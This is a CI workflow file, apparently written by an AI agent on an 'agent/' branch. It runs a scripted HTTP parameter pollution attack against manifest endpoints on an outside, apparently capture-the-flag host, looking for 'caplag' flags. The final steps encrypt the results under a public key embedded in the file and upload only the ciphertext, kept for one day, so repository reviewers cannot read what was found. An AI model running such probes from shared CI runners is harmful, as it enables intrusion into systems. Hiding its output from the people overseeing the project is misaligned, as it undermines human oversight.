name: launchlet-part3-manifesthpp
on:
  push:
    branches: [agent/launchlet-part3-manifesthpp-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe duplicate manifest selectors and encrypt differences
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,urllib.parse
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
          paths=['/assets/server-reference-manifest.json','/assets/build-manifest.json']
          baseline={p:s.get(base+p,timeout=8).text for p in paths}
          keys=['project','projectId','workspace','workspaceId','scope','mode','view','environment','env','target','stage','context','preview','deployRef','ref','build']
          public=['launchlet-demo-board','ws-launchlet-public','preview','2026.05.16-rc3']
          hidden=['internal','ws-launchlet-internal','enterprise','production','release','deploy','enterprise-rollout-closeout','preview-8b11c','8b11c','lrec_preview_demo_2026']
          cases=[]
          for k in keys:
            pub='launchlet-demo-board' if 'project' in k or k in ('context','preview') else ('ws-launchlet-public' if 'workspace' in k else ('2026.05.16-rc3' if k=='build' else 'preview'))
            for hid in hidden:
              cases += [(k,hid,pub),(k,pub,hid)]
          res=[]
          for p in paths:
            for k,a,b in cases:
              q=urllib.parse.urlencode([(k,a),(k,b)])
              r=s.get(base+p+'?'+q,headers={'Accept':'application/json'},timeout=8,allow_redirects=False)
              if r.status_code!=200 or r.text!=baseline[p]:
                item={'path':p,'query':q,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};res.append(item)
                flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
                if flags or ('serverActions' in r.text and r.text!=baseline[p]):
                  (out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
            if (out/'FOUND.txt').exists(): break
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-manifesthpp-encrypted
          path: artifact/
          retention-days: 1
